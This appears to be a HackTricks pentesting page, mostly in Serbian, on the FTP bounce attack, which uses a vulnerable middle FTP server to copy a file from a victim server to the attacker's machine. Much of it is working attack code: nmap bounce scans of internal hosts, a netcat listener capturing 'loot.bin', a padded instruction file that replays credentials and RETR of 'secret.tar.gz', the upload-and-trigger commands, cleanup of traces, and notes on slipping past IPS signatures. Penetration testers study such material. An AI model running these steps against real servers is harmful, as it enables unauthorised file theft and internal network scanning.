# FTP Bounce Preuzimanje 2 od FTP File

{{#include ../../banners/hacktricks-training.md}}


## Sažetak

Ako imate pristup **bounce FTP serveru**, možete ga naterati da zatraži fajlove sa **drugog FTP servera** (na kojem znate neke kredencijale) i preuzmete taj fajl na **svoj server**.

## Zahtevi

- Važeći FTP kredencijali za **FTP Middle server**
- Važeći FTP kredencijali za **Victim FTP server**
- Oba servera **prihvataju `PORT` command** (bounce FTP attack)
- Možete **pisati** u nekom direktorijumu **FTP Middle server**
- Middle server ima **veći pristup** unutar **Victim FTP server** nego vi

## Koraci

1. Povežite se na **svoj FTP server** i postavite konekciju u pasivni mod (`pasv` command) tako da on **sluša** u direktorijumu u koji će victim service poslati fajl.
2. Sastavite fajl koji će **FTP Middle server** poslati **Victim serveru** (the **exploit script**). Ovaj fajl treba da bude običan tekst sa komandama potrebnim za autentikaciju na **Victim server**, promenu direktorijuma i preuzimanje fajla na vaš server.
3. Povežite se na **FTP Middle Server** i otpremite prethodni fajl.
4. Naterajte FTP Middle server da **uspostavi konekciju** sa Victim serverom i pošalje exploit fajl.
5. **Preuzmite** fajl na svom FTP serveru.
6. **Obrišite** the exploit file sa **FTP Middle server**.

## Brza provera za ranjive bounce hostove

- **Nmap** i dalje podržava FTP bounce provere. Primer za verifikaciju potencijalnog middle servera:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
Ako server odbije third‑party `PORT` vrednosti, skeniranje neće uspeti; neki **ugrađeni/zastareli štampači, NAS i FTP demoni na namenskim uređajima** i dalje to dozvoljavaju.

## Automatizacija drugog FTP preuzimanja

Ispod je modernizovan način za preuzimanje fajla preko ranjivog srednjeg FTP servera.

1. **Open a passive listener** on your attack box (any TCP sink works):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Note** your IP as `A,B,C,D` and port `P` as `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Build the instruction file** that the middle server will replay to the victim:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Upload & trigger from the middle server** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Grab the file** from your listener (`loot.bin`).
6. **Clean up** the uploaded `instrs` file on the middle server.

Napomene:
- Padding (`dd ...`) sprečava zatvaranje kontrolne konekcije pre nego što RETR završi (problem sa velikim TCP prozorom o kojem se raspravlja u klasičnim writeup-ovima).
- Bilo koja usluga koja može **slušati i zapisivati TCP** može zameniti FTP PASV socket (npr., `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Ako srednji server ograničava privilegovane portove, koristite visoki port u `PORT` i prilagodite listener odgovarajuće.

## Dodatni trikovi

- Koristite a bounceable FTP server za **port-scan internal hosts** when file relay is blocked:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Neki moderni WAF/IDS (npr. Juniper IPS) dolaze sa potpisima posebno za **FTP:EXPLOIT:BOUNCE-ATTACK**; bučni payload-i ili nedostatak padding-a mogu ih aktivirati.
- Kada srednji server nameće "PORT to same host" ograničenja, postavite svoj **listener on the middle server itself** (ako imate write/execute) i kasnije preusmerite uhvaćeni fajl.

Za detaljniji old-school walkthrough pogledajte: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
